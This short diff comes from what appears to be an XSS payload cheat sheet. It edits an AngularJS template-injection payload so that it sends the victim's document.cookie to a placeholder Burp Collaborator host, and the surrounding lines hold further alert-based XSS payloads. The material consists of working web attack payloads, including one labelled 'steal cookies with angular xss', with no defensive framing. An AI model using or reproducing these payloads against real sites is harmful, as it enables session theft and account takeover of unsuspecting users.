@@ -142,7 +142,7 @@ http://xxxxx.com?&apos;-alert(414)-&apos;
 
 //angular
 {{$on.constructor('alert(1)')()}}
-{{$on.constructor('document.location=`http://<BURP-COLLABORATOR-URL>/`')()}} //steal cookies with angular xss
+{{$on.constructor('document.location=`http://<BURP-COLLABORATOR-URL>/?cookies=`+document.cookie')()}} //steal cookies with angular xss
 
 ```
 
